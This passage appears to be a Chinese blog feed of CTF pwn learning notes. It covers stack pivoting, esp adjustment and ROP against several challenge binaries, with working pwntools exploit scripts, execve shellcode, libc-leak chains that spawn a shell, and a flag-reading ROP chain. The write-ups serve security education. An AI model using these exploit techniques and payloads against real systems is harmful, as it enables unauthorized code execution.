class="hljs-string">'-&gt;'</span>)io.send(payload)io.interactive()</code></pre></div>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>Stack Migration</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>花式栈溢出（栈帧的调节）</title>
    <link href="/2020/02/05/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%EF%BC%88%E8%B0%83%E8%8A%82%E6%A0%88%E5%B8%A7%EF%BC%89/"/>
    <url>/2020/02/05/%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%EF%BC%88%E8%B0%83%E8%8A%82%E6%A0%88%E5%B8%A7%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="花式栈溢出（栈帧的调节）"><a href="#花式栈溢出（栈帧的调节）" class="headerlink" title="花式栈溢出（栈帧的调节）"></a>花式栈溢出（栈帧的调节）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本人刚学pwn不久，最近在学习过程中学到了各种需要栈帧调节的题目，以此记录一下。<br>在一些栈溢出的程序中，我们会碰到一些问题，例如溢出的可控字节数太少，无法构造我们想要的rop链，程序ASLR开启后导致的栈地址不可预测等。对于这种问题，常用的思路包括：</p><ul><li>加减esp值，控制栈指针</li><li>Stack Migration来构造一个假的栈帧。</li></ul><p>这里总结了2种题型：</p><h2 id="加减esp，把控栈指针"><a href="#加减esp，把控栈指针" class="headerlink" title="加减esp，把控栈指针"></a>加减esp，把控栈指针</h2><p>这种题型就需要用Ropgadget找一个控制esp的gadget，然后简单修改esp值的大小，来满足我们的需求。</p><h3 id="Alictf-016-vss"><a href="#Alictf-016-vss" class="headerlink" title="Alictf_016_vss"></a>Alictf_016_vss</h3><p>这个题目就是一个修改esp扩大栈空间，从而构造rop链获取shell的题目。</p><h4 id="检查保护和arch"><a href="#检查保护和arch" class="headerlink" title="检查保护和arch"></a>检查保护和arch</h4><p><img src="http://qiqianyun.chumen77.xyz/15808931260368.jpg" srcset="/img/loading.gif" alt="-w446"></p><h4 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h4><p>由于这个程序使用静态编译和strip命令剥离符号，用ida打开没有我们平时看的那么简单，<br>很多函数已经无法识别，我们就需要自己调试，然后推测是什么函数。<br><img src="http://qiqianyun.chumen77.xyz/15808932166761.jpg" srcset="/img/loading.gif" alt="-w618"><br>start函数中，call的函数是__libc_start_main, 上一行的 offset则是main函数<br>那个箭头就是main函数了。进入main函数以后，<strong>可以经过syscall中rax的参数来确认其是什么函数</strong>，很明显一个函数是alarm函数，先手动nop一下。<br><img src="http://qiqianyun.chumen77.xyz/15808934501240.jpg" srcset="/img/loading.gif" alt="-w555"><br>把这个函数去除后，方便gdb的后期调试。接着可以很容易确定一下puts函数跟read函数，在ida中修改一下。<img src="http://qiqianyun.chumen77.xyz/15808936171885.jpg" srcset="/img/loading.gif" alt="-w528"><br>下面那个40108e函数是比较复杂的，我用edb动态调试来确定出其中的某些函数：<br><img src="http://qiqianyun.chumen77.xyz/15808938970186.jpg" srcset="/img/loading.gif" alt="-w857"><br>对于这个函数，先确定一下其参数。<br><img src="http://qiqianyun.chumen77.xyz/15808939630394.jpg" srcset="/img/loading.gif" alt="-w824"><br><img src="http://qiqianyun.chumen77.xyz/15808939828470.jpg" srcset="/img/loading.gif" alt="-w322"><br>dump过去就会发现是复制了一份。所以就确定这个函数是<code>strncpy</code>是函数。<br>对于这个函数<code>char *strncpy(char *dest, const char *src, int n)</code><strong>将src指向的字符数组中n个字符复制到dest指向的字符数组中，在第一个空字符处停止，并返回被复制后的dest</strong>。<br><img src="http://qiqianyun.chumen77.xyz/15808946102427.jpg" srcset="/img/loading.gif" alt="-w781"><br>对于下一段就是判断一下，是否与0x79和0x70相等，可以来手动修改值让其相等。<br><img src="http://qiqianyun.chumen77.xyz/15808947377600.jpg" srcset="/img/loading.gif" alt="-w803"><br>往后走会发现先溢出了，在做溢出题的时候看到return 就应该想办法想上跳。<br><img src="http://qiqianyun.chumen77.xyz/15808948243514.jpg" srcset="/img/loading.gif" alt="-w368"><br>溢出的这个地址就是刚刚又syrcpy函数复制过来0x50字节中的最后8个字节，因为是strncpy函数，<strong>我们输入的字符串中是不能有\x00</strong>，否则会被截断，从而无法复制满0x50字节制造可控溢出，所以前0x48个字节中，我们不能写入任何地址。在这种情况下就需要通过修改esp来完成漏洞利用。</p><p>在最前面的read函数中，给了十分大的缓冲区可以用，我们可以把ROP链放在0x50字节之后，然后通过增加esp的值把栈顶抬到ROP链上，紧接着执行这个rop链即可。</p><p>查到one_gadget发现<code>0x000000000046f205 : add rsp, 0x58 ; ret</code>正好符合要求。然后gdb调试一下确定一下rop链从50个字节后的那里开始合适即可。<strong>（这个在找onegadget的时候注意不要把rsp搞成esp了，自己在做的时候因为这个调试了半天，才发现是这个错误，导致exp不成功）</strong></p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code>from pwn import *import timeio = process(&apos;./vss&apos;)e = ELF(&apos;./vss&apos;)io.recvuntil(&apos;Password:\n&apos;)add_rsp_0x58_ret = 0x0046f205pop_rax_ret = 0x0046f208pop_rdi_ret = 0x0401823pop_rsi_ret = 0x0401937pop_rdx_ret = 0x043ae05bss = 0x6C8178 -10syscall_ret = 0x0045f2a5rop1 = [    pop_rax_ret,    0,    pop_rdi_ret,    0,    pop_rsi_ret,    bss,    pop_rdx_ret,    10,    syscall_ret,    pop_rax_ret,    0x3b,    pop_rdi_ret,    bss,    pop_rsi_ret,    0,    pop_rdx_ret,    0,    syscall_ret]# raw_input(&apos;-&gt;&apos;)io.sendline(&apos;py&apos; + &apos;a&apos;*70 + p64(add_rsp_0x58_ret)+ &apos;b&apos;* 8 + &apos;&apos;.join(map(p64,rop1)))# raw_input(&apos;-&gt;&apos;)sleep(0.1)io.send(&apos;/bin/sh\x00&apos;)io.interactive()</code></pre></div><h3 id="X-CTF-Quals-2016-b0verfl0w"><a href="#X-CTF-Quals-2016-b0verfl0w" class="headerlink" title="X-CTF Quals 2016-b0verfl0w"></a>X-CTF Quals 2016-b0verfl0w</h3><h4 id="查保护和arch"><a href="#查保护和arch" class="headerlink" title="查保护和arch"></a>查保护和arch</h4><p><img src="http://qiqianyun.chumen77.xyz/15811429422510.jpg" srcset="/img/loading.gif" alt="-w438"><br>这个nx也没有开，可以用栈执行shellcode</p><h4 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h4><div class="hljs"><pre><code>signed int vul(){  char s; // [esp+18h] [ebp-20h]  puts(&quot;\n======================&quot;);  puts(&quot;\nWelcome to X-CTF 2016!&quot;);  puts(&quot;\n======================&quot;);  puts(&quot;What&apos;s your name?&quot;);  fflush(stdout);  fgets(&amp;s, 50, stdin);  printf(&quot;Hello %s.&quot;, &amp;s);  fflush(stdout);  return 1;}</code></pre></div><p>代码很简单，但是可以发现可以溢出的字节只有50-0x20-4=14个字节可控，所以是很难写出rop链来获取咱们目的的。然后就可以考虑控制栈指针的攻击思路，就是先把shellcode摆在栈上，然后控制eip到达这里就可以了。但是由于程序本身会开启 ASLR 保护，所以我们很难直接知道 shellcode 的地址。但是栈上相对偏移是固定的，所以我们可以利用栈溢出对 esp 进行操作，使其指向 shellcode 处，并且直接控制程序跳转至 esp 处。</p><p>找一下控制esp的gadget<br>    0x08048504 : jmp esp<br>然后怎么控制eip到shellcode上呢，因为没有nx保护，我们可以写一段指令来控制偏移：</p><div class="hljs"><pre><code>sub esp,0x28jmp esp</code></pre></div><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code>from pwn import *#io = process(&apos;./b0verfl0w&apos;)context.arch = &apos;i386&apos;io = remote(&apos;node3.buuoj.cn&apos;,29410)shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;shellcode += &quot;\x0b\xcd\x80&quot;sub_esp_jmp = asm(&apos;sub esp, 0x28;jmp esp&apos;)jmp_esp = 0x08048504payload = shellcode + (36-len(shellcode_x86))*&apos;b&apos;+p32(jmp_esp) + sub_esp_jmpio.readuntil(&apos;?\n&apos;)#raw_input(&apos;-&gt;&apos;)io.sendline(payload)io.interactive()</code></pre></div><h2 id="Stack-Migration"><a href="#Stack-Migration" class="headerlink" title="Stack Migration"></a>Stack Migration</h2><p>在 Stack Migration 中，我们所利用的技巧便是同时控制 EBP 与 EIP，这样我们在控制程序执行流的同时，也改变程序栈帧的位置。</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>我们知道在函数建立栈帧时有两条指令<code>push ebp; mov ebp, esp</code>，而退出时同样需要消除这两条指令的影响，即<code>leave(mov esp, ebp; pop ebp)</code> 。且leave一般紧跟着就是ret。<strong>因此，在存在栈溢出的程序中，只要我们能控制到栈中的ebp，我们就可以通过两次leave劫持栈。</strong></p><p><img src="http://qiqianyun.chumen77.xyz/15813373484321.jpg" srcset="/img/loading.gif" alt="-w533"><br>第一次随着程序流<code>leave; ret</code>，new esp为我们构造新栈的目标地址。 可以看到执行到ret时，esp还在原来的old栈上，而ebp已经指向了新的栈的栈顶。<br><img src="https://s2.ax1x.com/2020/02/11/1ovtYT.jpg" srcset="/img/loading.gif" alt="1ovtYT.jpg"><br>第二次进入我们放入栈上的<code>leave; ret</code> 的gadget（<strong>这个是我们事先写上栈的</strong>）esp已经被成功劫持到新的栈上，执行完gadget后栈顶会 在new_esp-4(64位是-8)的位置上。此时栈完全可控了，通过预先或者之后在new stack上布置的rop链可以轻松完成攻击。<br><img src="https://s2.ax1x.com/2020/02/11/1oxKN6.png" srcset="/img/loading.gif" alt="1oxKN6.png"><br><img src="https://s2.ax1x.com/2020/02/11/1ovjXj.png" srcset="/img/loading.gif" alt="1ovjXj.png"></p><h3 id="HITCON-training-lab6-64位"><a href="#HITCON-training-lab6-64位" class="headerlink" title="HITCON_training_lab6_64位"></a>HITCON_training_lab6_64位</h3><p>这个是在HITCON_training的一个练习，直接给的有源码，我给编译成了64位版本。</p><h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><div class="hljs"><pre><code>#include &lt;stdio.h&gt;int count = 1337 ;char *t= &quot;Z\xc3&quot; ;int main(){if( count!=1337 ){    _exit(1);}count++ ;char buf[48];setvbuf(stdout,0,2,0);puts(&quot;Try your best : &quot; );read(0, buf,128);return ;}</code></pre></div><p><code>gcc  -z relro -z now -fno-stack-protector -mpreferred-stack-boundary=2 migration.c -o migration</code> 编译命令</p><h4 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h4><p>这个题纯粹就是为了练习的Stack Migration用的，可以不分析代码直接用gdb-peda直接来测试：<br><img src="http://qiqianyun.chumen77.xyz/15813398610900.jpg" srcset="/img/loading.gif" alt="-w332"><br><img src="http://qiqianyun.chumen77.xyz/15813398926858.jpg" srcset="/img/loading.gif" alt="-w955"><br>熟悉的栈溢出，但是下面多出来的一些字符串，也是程序不能接受的部分，也可以作为一个需要考虑栈迁移的标志。<br><img src="https://s2.ax1x.com/2020/02/11/1og2r9.jpg" srcset="/img/loading.gif" alt="1og2r9.jpg"><br>注意一下rsp被覆盖的值。<br><img src="https://s2.ax1x.com/2020/02/11/1ogs8U.jpg" srcset="/img/loading.gif" alt="1ogs8U.jpg"><br>计算padding为48.<br><img src="https://s2.ax1x.com/2020/02/11/1ogwEq.jpg" srcset="/img/loading.gif" alt="1ogwEq.jpg"><br>计算一下，可以填入多少的可控字段。去除一下刚刚程序不能存入的部分和padding部分，还有80个字节可以用。其中一个来伪造new esp，剩下也就还有9个gadget可以用，可以给我构造第一个rop链。</p><h4 id="图解分析"><a href="#图解分析" class="headerlink" title="图解分析"></a>图解分析</h4><p>假设我们已经填入了溢出字符，buf1即为我们要去的新栈，这个选择bss段的后一半：<br><img src="https://s2.ax1x.com/2020/02/11/1ogabn.jpg" srcset="/img/loading.gif" alt="1ogabn.jpg"><br>开始执行一下leave 中的<code>mov rsp,rbp</code>：<br><img src="https://s2.ax1x.com/2020/02/11/1ogUDs.jpg" srcset="/img/loading.gif" alt="1ogUDs.jpg"><br>此时rsp 也指向了 rbp指向的位置，在执行leave中的<code>pop rbp</code>:<br><img src="https://s2.ax1x.com/2020/02/11/1ocMfU.jpg" srcset="/img/loading.gif" alt="1ocMfU.jpg"><br>此时rbp已经到了我们伪造的新栈buf1，然后开始执行ret,进入执行pop_rdi的gadget:<br><img src="https://s2.ax1x.com/2020/02/11/1ocZmn.jpg" srcset="/img/loading.gif" alt="1ocZmn.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1ocklQ.jpg" srcset="/img/loading.gif" alt="1ocklQ.jpg"></p><p>此时已经将buf1的地址，推入rdi，作为gets的参数，执行gets函数后，我们就可以往buf1上填入我们的rop链，此时栈大小已经没有限制了，可以任意写。<br><img src="https://s2.ax1x.com/2020/02/11/1o6oo6.jpg" srcset="/img/loading.gif" alt="1o6oo6.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1o6gWF.jpg" srcset="/img/loading.gif" alt="1o6gWF.jpg"><br>在这个buf1的栈空间里，我们需要先把rbp指向的位置写入buf2（下一个构造的新栈），然后构造rop链把puts的内存地址给泄露出来，进而可以算出libc的基地址，接着再构造一个gets函数。接着是执行一下leave 的gadget：<br><img src="https://s2.ax1x.com/2020/02/11/1o60Ln.jpg" srcset="/img/loading.gif" alt="1o60Ln.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1o6NRg.jpg" srcset="/img/loading.gif" alt="1o6NRg.jpg"><br>执行完以后就可以发现我们，已经完全控制了栈。并且开了一个buf2的新栈，留着在buf1调用gets函数时来在buf2新栈中摆上调用system(/bin/sh)函数的rop链。然后继续执行：<br><img src="https://s2.ax1x.com/2020/02/11/1o6tJS.jpg" srcset="/img/loading.gif" alt="1o6tJS.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1o6Yi8.jpg" srcset="/img/loading.gif" alt="1o6Yi8.jpg"><br>这就泄露出了puts函数的内存地址。接着开始往buf2新栈上读rop链:<br><img src="https://s2.ax1x.com/2020/02/11/1o6lqI.jpg" srcset="/img/loading.gif" alt="1o6lqI.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1o6QsA.jpg" srcset="/img/loading.gif" alt="1o6QsA.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1o6VIK.jpg" srcset="/img/loading.gif" alt="1o6VIK.jpg"><br>读入完成，接着再次执行leave的gadget：<br><img src="https://s2.ax1x.com/2020/02/11/1o6AVx.jpg" srcset="/img/loading.gif" alt="1o6AVx.jpg"><br><img src="https://s2.ax1x.com/2020/02/11/1oyk4S.jpg" srcset="/img/loading.gif" alt="1oyk4S.jpg"><br>可以看到esp到了新栈，rbp因为刚刚在buf2填入的buf1，又会到了buf1，这个地址可以随便填了，对做题不影响，填写这个只是可以看到再次栈转移。接着执行buf2新栈的rop链：<br><img src="https://s2.ax1x.com/2020/02/11/1os600.jpg" srcset="/img/loading.gif" alt="1os600.jpg"><br>就可以拿到shell了。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>借着这个思路就可以开始写exp:</p><div class="hljs"><pre><code>from pwn import *import timecontext.arch = &apos;amd64&apos;context.log_level = &apos;debug&apos;e = ELF(&apos;./test&apos;)l = ELF(&apos;/lib/x86_64-linux-gnu/libc-2.23.so&apos;) # io = remote(&apos;127.0.0.1&apos;,4000)io = process(&apos;./test&apos;)pop_rdi_ret = 0x400703pop_rsi_r15_ret= 0x0400701pop_rdx_ret= 0x0400724leave_ret= 0x0400699buf1 = 0x00602000 - 0x200buf2 = buf1 + 0x100padding = 56 - 8puts_plt = e.symbols[&apos;puts&apos;]puts_got = e.got[&apos;puts&apos;]read_add = e.symbols[&apos;read&apos;]io.recvuntil(&apos;:&apos;)p = &apos;a&apos;*padding + flat([buf1,pop_rdi_ret,0,pop_rsi_r15_ret,buf1,0,pop_rdx_ret,0x100,read_add,leave_ret])#raw_input(&apos;-&gt;&apos;)io.send(p)sleep(0.1)p = flat([buf2,pop_rdi_ret,puts_got,puts_plt,pop_rdi_ret,0,pop_rsi_r15_ret,buf2,0,pop_rdx_ret,0x100,read_add,leave_ret])sleep(0.1)#raw_input(&apos;-&gt;&apos;)io.sendline(p)io.recvuntil(&apos;\n&apos;)puts = u64((io.recv(6)).ljust(8,&apos;\x00&apos;))libc = puts - l.symbols[&apos;puts&apos;]print(&apos;libc_base:&apos; + hex(libc))binsh_add = l.search(&apos;/bin/sh\x00&apos;).next() + libc#print(binsh_add)# raw_input(&apos;-&gt;&apos;)system_add = l.symbols[&apos;system&apos;] + libcp = flat([buf1,pop_rdi_ret,binsh_add,system_add])sleep(0.1)io.sendline(p)io.interactive()</code></pre></div><h3 id="Hgame2020-week2-rop-level2"><a href="#Hgame2020-week2-rop-level2" class="headerlink" title="Hgame2020_week2_rop_level2"></a>Hgame2020_week2_rop_level2</h3><h4 id="查保护和arch-1"><a href="#查保护和arch-1" class="headerlink" title="查保护和arch"></a>查保护和arch</h4><p><img src="https://s2.ax1x.com/2020/02/11/1os8OI.jpg" srcset="/img/loading.gif" alt="1os8OI.jpg"><br>32位程序，开了nx保护</p><h4 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h4><p><img src="https://s2.ax1x.com/2020/02/11/1osEO1.md.jpg" srcset="/img/loading.gif" alt="1osEO1.md.jpg"><br>这个明显的栈溢出，但是0x60-0x50-0x8 = 8。发现只有一个gadget位置，无法构造我们想要的rop链。但是前面的第一个read函数，可以读入很大空间，并且第二个参数buf的地址是固定的。<br><img src="https://s2.ax1x.com/2020/02/11/1orMMn.jpg" srcset="/img/loading.gif" alt="1orMMn.jpg"><br>那这个题明显就是可以Stack Migration来解决问题了，并且只需再写一个leave ret就控制栈了。</p><h5 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h5><p>程序中有着open，read，puts函数，我们可以写一个rop链，调用open函数，控制其参数是<code>./flag</code>，并在gdb中调试将其返回的文件fd号记录下来，然后传递给read函数，让其读入文件内容存入某个缓冲区，再用puts函数输出一下flag文件的内容即可。在第一个read的时候，我们就需要写好rop链。然后在最后一个read函数时，控制好ebp指向我们的新栈。</p><h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><div class="hljs"><pre><code>from pwn import *context.log_level = &apos;debug&apos;context.arch = &apos;amd64&apos;# io = process(&apos;./ROP&apos;)io = remote(&apos;47.103.214.163&apos;,20300)e = ELF(&apos;./ROP&apos;)buf = 0x06010A0# libc = e.libcpadding = 80leave_ret = 0x040090dpop_rdi_ret = 0x00400a43pop_rsi_r15 = 0x00400a41open_plt = 0x4007b0read_plt = 0x400780puts_plt = 0x400760io.recvuntil(&apos;think so?\n&apos;)p = flat([&apos;./flag\x00\x00&apos;,pop_rdi_ret,buf,pop_rsi_r15,0,0,open_plt,pop_rdi_ret,4,pop_rsi_r15,buf+0x80,0,read_plt,pop_rdi_ret,buf+0x80,puts_plt])io.sendline(p)io.recvuntil(&apos;\n&apos;)p = padding * &apos;a&apos; + p64(buf) + p64(leave_ret)raw_input(&apos;-&gt;&apos;) #手动下一个断点，以后让gdb附加上进行调试io.send(p)flag = io.recvline_contains(&apos;hgame&apos;)print(flag)io.interactive()</code></pre></div><p>我们跟着exp来调试一下，看看效果：<br><img src="https://s2.ax1x.com/2020/02/11/1or3ZV.jpg" srcset="/img/loading.gif" alt="1or3ZV.jpg"><br>此时的esp是我们伪造的new esp，已经指向了我们的目标位置，并且第一个rop链接已经送过去，可以看到<code>./flag</code>的字眼。执行一下leave：<br><img src="https://s2.ax1x.com/2020/02/11/1orGIU.jpg" srcset="/img/loading.gif" alt="1orGIU.jpg"><br>可以看到rbp的值已经等于我们伪造的值，esp还在原来栈上。接着执行ret，进入下一个leave ret：<br><img src="https://s2.ax1x.com/2020/02/11/1orQrq.jpg" srcset="/img/loading.gif" alt="1orQrq.jpg"><br>先记录下当前的状态，开始执行leave：<br><img src="https://s2.ax1x.com/2020/02/11/1or8aT.jpg" srcset="/img/loading.gif" alt="1or8aT.jpg"><br>执行完发现esp已经到达了新栈buf+8的位置，此时的栈帧已经是我们完全想要的，已经劫持了程序流程，并且新栈空间很大，可以满足我们的需求。ebp是多少已经不重要了，我们直接填入<code>./flag</code>，这个固定地址也做为给open函数做参数。<br><img src="https://s2.ax1x.com/2020/02/11/1ormGQ.jpg" srcset="/img/loading.gif" alt="1ormGQ.jpg"><br>在调试的时候，执行完open函数需要把返回的fd值记录下，给read函数做参数。最后由puts函数在输出flag：<br><img src="https://s2.ax1x.com/2020/02/11/1oDzPe.jpg" srcset="/img/loading.gif" alt="1oDzPe.jpg"></p><h3 id="Stack-Migration小总结"><a href="#Stack-Migration小总结" class="headerlink" title="Stack Migration小总结"></a>Stack Migration小总结</h3><p> 这下可以总结下利用思路也就是</p><ul><li>把控好起初栈的ebp，在里面写入需要伪造的new esp</li><li>在之后的可利用字节中写入leave gadget</li><li>将想执行的ROP Chain写在已知固定位置上</li><li>再利用leave搬移Stack位置到已知位置</li><li>然后无限接ROP Chain</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>学习记录</tag>
      
      <tag>Stack Migration</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ROP题目练习</title>
    <link href="/2020/02/03/ROP%E7%BB%83%E4%B9%A0/"/>
    <url>/2020/02/03/ROP%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="ROP题目练习"><a href="#ROP题目练习" class="headerlink" title="ROP题目练习"></a>ROP题目练习</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在学习栈溢出，做了一些ROP的练习题，基本都是buuoj的题目，搜索rop字眼找的rop题。简单记录一下收获和exp。</p><h1 id="有libc（或者无libc可做）"><a href="#有libc（或者无libc可做）" class="headerlink" title="有libc（或者无libc可做）"></a>有libc（或者无libc可做）</h1><h2 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="OGeek2019_babyrop"></a>OGeek2019_babyrop</h2><h3 id="查保护和arch"><a href="#查保护和arch" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><p><img src="/2020/02/03/ROP练习/images/15807186229840.jpg" srcset="/img/loading.gif" alt="-w621"><br>32位程序，开启NX堆栈不可执行。</p><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="/2020/02/03/ROP练习/images/15807186890200.jpg" srcset="/img/loading.gif" alt="-w373"><br>可以看出其取了一个随机数，存入buf。<br><img src="/2020/02/03/ROP练习/images/15807187726931.jpg" srcset="/img/loading.gif" alt="-w413"><br>然后进入这个函数分析，看到接收buf传来的值，放入s中。然后下面接收你传入的东西，与s判断是否相同，不相同就会退出。然后如果不退出返回值是v5，但是这里的v5在函数中是没有经过处理的。看一下汇编：<br><img src="/2020/02/03/ROP练习/images/15807191082469.jpg" srcset="/img/loading.gif" alt="-w508"><br>v5咱们想控制，就只能通过原来那个read函数，咱们传入的值去控制。返回值给v2，然后v2作为参数然后进入下面这个带有溢出的函数中。<br> <img src="/2020/02/03/ROP练习/images/15807191871406.jpg" srcset="/img/loading.gif" alt="-w375"><br>观察后，可以看出咱们应该把这个返回的参数整的大一点，方便进行写ROP链。</p><h4 id="分析总结"><a href="#分析总结" class="headerlink" title="分析总结"></a>分析总结</h4><p>其中对于绕过相等判断，可以利用一下strlen函数的特性，然后直接用<code>\x00</code>来截断。<br>v5这个返回参数可以控制为’\xff’,然后进入带有溢出的函数，写rop链就行了。<br>先用puts函数泄露出<code>__libc_start_main</code>的地址，然后在给的libc中确认下symbols，然后拿到libc基址，然后直接利用one gadget RCE即可。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> time<span class="hljs-comment"># io = process('./pwn')</span>io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27780</span>)libc = ELF(<span class="hljs-string">'./libc-2.23.so'</span>)<span class="hljs-comment"># blibc = ELF('/lib/i386-linux-gnu/libc-2.23.so')</span>elf = ELF(<span class="hljs-string">'./pwn'</span>)<span class="hljs-comment"># raw_input('-&gt;')</span>p1 = <span class="hljs-string">'\x00'</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\xff'</span>) offset = <span class="hljs-number">0xe7</span> + <span class="hljs-number">4</span>io.send(p1 + <span class="hljs-string">'\n'</span>)io.recvline_contains(<span class="hljs-string">'Correct'</span>)start_add=<span class="hljs-number">0x080485A0</span>put_add = elf.symbols[<span class="hljs-string">'puts'</span>]libc_start_add = elf.got[<span class="hljs-string">'__libc_start_main'</span>]rop1 = [    put_add,    start_add,    libc_start_add]p2 = offset * <span class="hljs-string">'\x00'</span> + <span class="hljs-string">''</span>.join(map(p32,rop1))io.sendline(p2)sleep(<span class="hljs-number">1</span>)libc_base = u32(io.recv(<span class="hljs-number">4</span>)) - libc.symbols[<span class="hljs-string">'__libc_start_main'</span>]REC = libc_base+<span class="hljs-number">0x3a80c</span>print(<span class="hljs-string">'libc_base :'</span>+hex(libc_base))offset = <span class="hljs-number">0xe7</span> + <span class="hljs-number">4</span>io.send(p1 + <span class="hljs-string">'\n'</span>)io.recvline_contains(<span class="hljs-string">'Correct'</span>)p3 = offset * <span class="hljs-string">'\x00'</span> + p32(REC)io.sendline(p3)io.interactive()</code></pre></div><h2 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="HarekazeCTF2019_baby_rop"></a>HarekazeCTF2019_baby_rop</h2><h3 id="查保护和arch-1"><a href="#查保护和arch-1" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><p><img src="/2020/02/03/ROP练习/images/15807395869628.jpg" srcset="/img/loading.gif" alt="-w624"></p><h3 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">int</span> __<span class="hljs-function">cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span>&#123;  <span class="hljs-keyword">char</span> v4; <span class="hljs-comment">// [rsp+0h] [rbp-10h]</span>  system(<span class="hljs-string">"echo -n \"What's your name? \""</span>);  __isoc99_scanf(<span class="hljs-string">"%s"</span>, &amp;v4);  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Welcome to the Pwn World, %s!\n"</span>, &amp;v4);  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p>程序十分简单，给了system函数，且明显存在溢出。<br><img src="/2020/02/03/ROP练习/images/15807396970009.jpg" srcset="/img/loading.gif" alt="-w502"><br>ida查看字符串，该可以发现<code>/bin/sh</code>/，这构造个简单rop链直接利用就好了。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs undefined">from pwn import *import time<span class="hljs-comment"># io = process('./babyrop')</span>io = remote('node3.buuoj.cn',28633)elf = ELF('./babyrop')offset = 0x10 + 8binsh_add = 0x0601048pop_rdi_ret=0x000400683 system_add = elf.symbols['system']<span class="hljs-comment"># io.recvline_contains('your')</span><span class="hljs-comment"># raw_input('-&gt;')</span>p = 'a' * offset + p64(pop_rdi_ret) + p64(binsh_add) + p64(system_add)io.sendline(p)io.interactive()</code></pre></div><p>拿到shell后，这个题buuctf根目录下没有flag文件。需要<code>find / -name &quot;flag&quot;</code> 可以查到是在<code>/home/babyrop/flag</code>这个目录下。</p><h2 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="HarekazeCTF2019_baby_rop2"></a>HarekazeCTF2019_baby_rop2</h2><h3 id="查保护和arch-2"><a href="#查保护和arch-2" class="headerlink" title="查保护和arch"></a>查保护和arch</h3><p><img src="/2020/02/03/ROP练习/images/15808200972779.jpg" srcset="/img/loading.gif" alt="-w310"></p><h3 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="/2020/02/03/ROP练习/images/15808200578822.jpg" srcset="/img/loading.gif" alt="-w577"><br>函数过程很简单，明显栈溢出，思路就是先栈溢出构造rop链，让pintf函数打印出<code>__libc_start_main</code>函数在内存的地址，然后在给的libc文件中获取一下其sympol是的值，然后再计算出它的基址，再让函数返回到shart处清理一下栈，然后再次利用onegadget RCE构造相关rop链即可。</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs undefined">from pwn import *import timeio = process('./babyrop2')<span class="hljs-comment"># blibc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')</span><span class="hljs-comment"># context.log_level = 'debug'</span>libc = ELF('./libc.so.6')io = remote('node3.buuoj.cn',27694)elf = ELF('./babyrop2')offset = 40__libc_start_add = elf.got['__libc_start_main']start_add = 0x0400540 printf_add = elf.symbols['printf']aWelcomeToThePw = 0x400770 pop_rdi_ret= 0x000400733pop_rsi_r15_ret = 0x00400731 libc_start_sys = libc.symbols['__libc_start_main']rop1 = [    pop_rdi_ret,    aWelcomeToThePw,    pop_rsi_r15_ret,    